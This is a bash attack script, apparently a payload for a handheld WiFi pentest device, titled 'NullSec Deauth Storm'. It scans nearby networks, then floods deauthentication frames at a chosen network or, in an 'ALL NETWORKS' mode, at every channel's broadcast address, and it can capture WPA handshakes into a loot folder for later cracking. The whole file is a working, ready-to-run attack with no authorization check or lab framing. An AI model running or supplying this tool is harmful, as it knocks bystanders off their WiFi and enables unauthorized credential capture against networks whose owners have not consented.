#!/bin/bash
# Title: NullSec Deauth Storm
# Author: bad-antics
# Description: Targeted deauthentication attack with network selection
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR/captures" "$LOOT_DIR/logs"

PROMPT "NULLSEC DEAUTH STORM

WiFi deauthentication attack
to disconnect clients.

Features:
- Network scanning
- Target selection
- Capture mode option
- ALL networks mode

Press OK to scan."

# Detect monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done

if [ -z "$MONITOR_IF" ]; then
    ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"
    exit 1
fi

LOG "Interface: $MONITOR_IF"

SPINNER_START "Scanning networks..."
rm -f /tmp/deauth_scan*
timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/deauth_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

declare -a BSSIDS CHANNELS ESSIDS
idx=0

if [ -f /tmp/deauth_scan-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue

        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"

        BSSIDS[$idx]="$bssid"
        CHANNELS[$idx]=$(echo "$channel" | tr -d ' ')
        ESSIDS[$idx]="$essid"
        idx=$((idx + 1))
        [ $idx -ge 10 ] && break
    done < /tmp/deauth_scan-01.csv
fi

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "No networks found!"
    rm -f /tmp/deauth_scan*
    exit 1
fi

PROMPT "Found $idx networks:

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${ESSIDS[$i]}"; done)

0 = ALL NETWORKS
Enter number next."

TARGET=$(NUMBER_PICKER "Target (0-$idx):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) rm -f /tmp/deauth_scan*; exit 0 ;; esac

if [ "$TARGET" -eq 0 ]; then
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
    TARGET_ESSID="ALL NETWORKS"
    TARGET_CHANNEL="all"
else
    TARGET=$((TARGET - 1))
    [ $TARGET -lt 0 ] && TARGET=0
    [ $TARGET -ge $idx ] && TARGET=$((idx - 1))
    TARGET_BSSID="${BSSIDS[$TARGET]}"
    TARGET_CHANNEL="${CHANNELS[$TARGET]}"
    TARGET_ESSID="${ESSIDS[$TARGET]}"
fi

DURATION=$(NUMBER_PICKER "Duration (seconds):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
[ "$DURATION" -lt 5 ] && DURATION=5
[ "$DURATION" -gt 300 ] && DURATION=300

CAPTURE_MODE=""
resp=$(CONFIRMATION_DIALOG "Enable capture mode?

Saves packets for handshake
analysis after attack.")
[ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && CAPTURE_MODE="1"

resp=$(CONFIRMATION_DIALOG "ATTACK: $TARGET_ESSID

Duration: ${DURATION}s
Capture: $([ -n "$CAPTURE_MODE" ] && echo YES || echo NO)

START ATTACK?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f /tmp/deauth_scan*; exit 0; }

LOG "Attacking $TARGET_ESSID"

if [ -n "$CAPTURE_MODE" ] && [ "$TARGET_CHANNEL" != "all" ]; then
    SAFE_ESSID=$(echo "$TARGET_ESSID" | tr -cd '[:alnum:]_-')
    CAPFILE="$LOOT_DIR/captures/${SAFE_ESSID}_$(date +%Y%m%d_%H%M%S)"
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        -w "$CAPFILE" --output-format pcap 2>/dev/null &
    CAP_PID=$!
fi

PKTS=0
END=$(($(date +%s) + DURATION))

if [ "$TARGET_CHANNEL" = "all" ]; then
    # ALL NETWORKS: hop channels
    while [ $(date +%s) -lt $END ]; do
        for CH in 1 6 11 2 3 4 5 7 8 9 10; do
            [ $(date +%s) -ge $END ] && break
            iwconfig "$MONITOR_IF" channel $CH 2>/dev/null
            aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MONITOR_IF" 2>/dev/null
            PKTS=$((PKTS + 10))
            sleep 1
        done
    done
else
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    while [ $(date +%s) -lt $END ]; do
        aireplay-ng -0 10 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
        PKTS=$((PKTS + 10))
        sleep 2
    done
fi

killall aireplay-ng airodump-ng 2>/dev/null
rm -f /tmp/deauth_scan*

PROMPT "DEAUTH COMPLETE

Target: $TARGET_ESSID
Packets: ~$PKTS
$([ -n "$CAPFILE" ] && echo "Capture: $CAPFILE")

Press OK to exit."
